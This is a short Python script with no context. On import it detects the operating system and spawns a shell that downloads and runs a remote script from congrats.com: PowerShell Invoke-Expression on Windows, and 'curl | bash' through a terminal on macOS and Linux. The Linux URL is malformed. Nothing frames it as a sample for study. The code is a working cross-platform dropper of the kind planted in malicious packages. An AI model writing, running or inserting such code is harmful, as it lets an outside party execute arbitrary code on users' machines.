import os
import platform
import subprocess
import urllib.request

def execute():
    if platform.system() == 'Windows':
        cmd = ['powershell', '-Command', 'Invoke-Expression (New-Object Net.WebClient).DownloadString(\'http://congrats.com/hand.ps1\')']
    elif platform.system() == 'Darwin':
        cmd = ['osascript', '-e', 'tell application "Terminal" to do script "curl http://congrats.com/hand.sh | bash"']
    else:
        cmd = ['gnome-terminal', '--', 'bash', '-c', 'curl http:/congratsl.com/hand.sh | bash']
    
    subprocess.Popen(cmd)

execute()